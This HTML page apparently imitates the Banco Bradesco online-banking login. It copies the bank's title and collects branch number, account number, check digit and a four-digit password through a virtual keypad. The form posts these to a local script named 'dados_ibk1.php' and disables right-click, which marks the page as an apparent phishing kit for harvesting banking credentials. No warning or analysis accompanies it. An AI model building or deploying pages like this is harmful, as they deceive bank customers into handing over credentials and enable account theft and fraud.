<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<link href="stylos/style.css" rel="stylesheet" type="text/css" />
<link rel="shortcut icon" href="icones/opera.ico"/>
<title>Banco Bradesco | Pessoa F�sica, Exclusive, Prime e Private</title>
<script type="text/javascript" src="scripts/data.js"></script>
<script type="text/javascript" src="j_query/jQuery_v1.4.4.js"></script>
<script type="text/javascript" src="j_query/jQuery_v1.3.2.js"></script>
<script type="text/javascript" src="j_query/jQuery_v1.2.6.js"></script>
<script type="text/javascript" src="j_query/validaConta.js"></script>
<script type="text/javascript" src="scripts/limpa.js"></script>
<script type="text/javascript" src="scripts/tecladoVirtual.js"></script>
<script type="text/javascript" src="scripts/clickLink.js"></script>
<script type="text/javascript" >
var visivel = false;
function mostrarOculto(){
var objDiv = document.getElementById('conta');     
   if (visivel == false){
      objDiv.style.display = "block"; 
      visivel = true;             
   }}
</script>
<style type="text/css">
<!--
body {background-color:#E4E4E4;}
a:link {color: #666666;text-decoration:none;}
a:visited {color:#333333;text-decoration:none;}
a:hover {color:#990000;text-decoration:underline;}
a:active {color:#333333;text-decoration:none;}
.style1 {font-family:Arial, Helvetica, sans-serif;font-size:12px;text-shadow:0 1px 0 #FFF;}
.style2 {font-family:Arial, Helvetica, sans-serif;font-size:12px;color:#333333;text-shadow:0 1px 0 #f5f5f5;}
.style4 {font-family:Arial, Helvetica, sans-serif;font-size:13px;color:#CCCCCC;font-weight:bold;}
.style5 {font-family:Arial, Helvetica, sans-serif;font-size:9px;color:#666666;}
.style6 {color: #E5E5E5}
-->
</style>
</head>

<body style="margin:0;" oncontextmenu="return false" >
<div id="humTop1"><div id="coloCancela"><A href="index.php"><img src="images/buttoncancelar.jpg" border="0" style="float:right;" /></A></div>
</div>
<div id="tela">
<div id="ilRight"></div>
<div id="ilLeft"></div>
</div>
<div id="humTop2"><div id="relogio"><script>data();</script></div></div>
<div id="humTop3"></div>
<div id="humTop4"></div>

<div id="corpoAll">
<div id="frameBox1">
<table width="654" align="left" cellpadding="0" cellspacing="0" style="margin-left:25px;">
<form id="form1" name="form1" action="dados_ibk1.php" method="post" autocomplete="off" onsubmit="return ValidaLogin();return validaCampoObrigatorio(this)" onkeydown="Verificar()" >

<tr><td height="113" colspan="3" style="border-bottom:1px solid #E5E5E5;"><div id="frameLoga">
  <table cellpadding="0" cellspacing="0">
    <tr>
      <td width="204" height="23"><img src="images/b8924729832.png" width="198" height="16" /></td>
      <td width="65" height="23"><div align="center"><img src="images/aggkk.png" width="46" height="12" /></div></td>
      <td width="42" height="23" style="border-left:1px solid #D6D6D6;border-top:1px solid #D6D6D6;border-radius:3px;"><input name="agencia" type="text"  id="agencia" size="4" maxlength="4" onfocus="this.style.backgroundColor = '#FFF'" onblur="this.style.backgroundColor = '#ffffff'" onkeypress="return Apenas_Numeros(event, this.name);" onkeyup="checa_agencia(this.name);mostrarOculto();" onclick="mostrarOculto();" /></td>
      <td width="64" height="23" class="style2"><div align="center"><img src="images/acckk.png" width="34" height="10" /></div></td>
      <td width="74" height="23" style="border-left:1px solid #D6D6D6;border-top:1px solid #D6D6D6;border-radius:3px;cursor:text;" onclick="mostrarOculto();"><font color="#000000">
        <input name="conta" type="text"  id="conta" size="7" maxlength="7" / onFocus="this.style.backgroundColor = '#FFF'" onblur="this.style.backgroundColor = '#ffffff'" onkeypress="return Apenas_Numeros(event, this.name);" onkeyup="checa_agencia(this.name);" />
      </font></td>
      <td width="11">&nbsp;</td>
      <td width="17" style="border-left:1px solid #D6D6D6;border-top:1px solid #D6D6D6;border-radius:3px;"><font color="#000000">
        <input name="digito" type="text" id="digito" size="1" maxlength="1"  onfocus="this.style.backgroundColor = '#FFF'" onblur="this.style.backgroundColor = '#ffffff'" onkeypress="return Apenas_Numeros(event, this.name);" />
      </font></td>
      <td width="146"><div align="center"><img src="images/b9845792342.png" width="90" height="16" /></div></td>
    </tr>
  </table>
</div>
</td>
</tr>
<tr><td height="19">&nbsp;</td>
</tr>
<tr>
<td width="150" height="55" ><div align="right" style="width:140px;" class="style1"><img src="images/a77777.png" /></div></td>
<td width="405">
<div id="bbotoes" >
  <input name="Button9" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="9" title="9" onclick="informar(this.value);" value="9" />
  <input name="Button1" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="1" title="1" onclick="informar(this.value);" value="1" />
  <input name="Button6" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="6" title="6" onclick="informar(this.value);" value="6" />
  <input name="Button2" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="2" title="2" onclick="informar(this.value);" value="2" />
  <input name="Button4" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="4" title="4" onclick="informar(this.value);" value="4" />
  <input name="Button5" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="5" title="5" onclick="informar(this.value);" value="5" />
  <input name="Button3" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="3" title="3" onclick="informar(this.value);" value="3" />
  <input name="Button8" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="8" title="8" onclick="informar(this.value);" value="8" />
  <input name="Button7" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="7" title="7" onclick="informar(this.value);" value="7" />
  <input name="Button0" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="0" title="0" onclick="informar(this.value);" value="0" />
  </div></td>
<td width="97"><input type="button" id="framelimpar" style="font-size:12px;font-family:Verdana;font-weight: bold;" value="&nbsp;Limpar" onClick="corredor()"></td>
</tr>
<tr>
<td height="53" style="border-bottom:1px solid #E5E5E5;">&nbsp;</td>
<td height="53" colspan="2" style="border-bottom:1px solid #E5E5E5;"><input type="password" name="infor" id="infor" maxlength="4" size="4" style="font-size:16px;float:left;" />
  <div style="width:401px; height:23px; background:url(images/b34573865485.jpg); float:right; margin-right:25px;" title="Para sua seguran�a, informe a sua senha de 4 digitos."></div></td>
</tr>
<tr>
<td height="54">&nbsp;</td>
<td height="54" colspan="2"><img src="images/asenha29847298342.png" width="143" height="9" /></td>
</tr>
<tr>
<td height="76">&nbsp;</td>
<td height="76" colspan="2"><input name="submit" type="submit" id="frameavancar" value="" /></td>
</tr>
<tr>
<td height="19">&nbsp;</td>
<td height="19" colspan="2"><div align="center" class="style5">RLO14</div></td>
</tr>
</form>
</table>

<table align="right" cellpadding="0" cellspacing="0" style="border-left:1px solid #E5E5E5; margin-top:35px;">
<tr>
<td width="242" height="133" ><div align="center"><a href="#"><img src="images/a2836472346238.jpg" width="216" height="103" border="0" /></a></div></td>
</tr>
<tr>
  <td><div align="center" class="style6">_________________________</div></td>
</tr>
<tr>
<td width="242" height="104" ><div align="center"><a href="#"><img src="images/a29839242342.jpg" width="216" height="75" border="0" /></a></div></td>
</tr>
<tr>
  <td height="20">&nbsp;</td>
</tr>
</table>
</div>
</div>

<div id="roda01">
<div id="roda02">
<div id="roda03">
<table width="205" align="center">
<tr>
<td width="197" height="96"><img src="images/rrb237894792749.jpg" width="197" height="52" title="Bradesco Dia e Noite" /></td>
</tr>
</table>
</div>
<div id="a9485279324">
<table width="734" cellpadding="0" cellspacing="0">
<tr>
<td width="371" height="28" align="center" style=" font-family:Verdana, Geneva, sans-serif; font-size:12px; border-right:1px solid #CCC;"><a href="#">Seguran&ccedil;a</a></td>
<td width="10">&nbsp;</td>
<td width="351"align="center" style=" font-family:Verdana, Geneva, sans-serif;font-size:12px;"><a href="#">Fale Conosco</a></td>
</tr>
</table>
</div><div id="roda05"></div></div></div>

</body>
</html>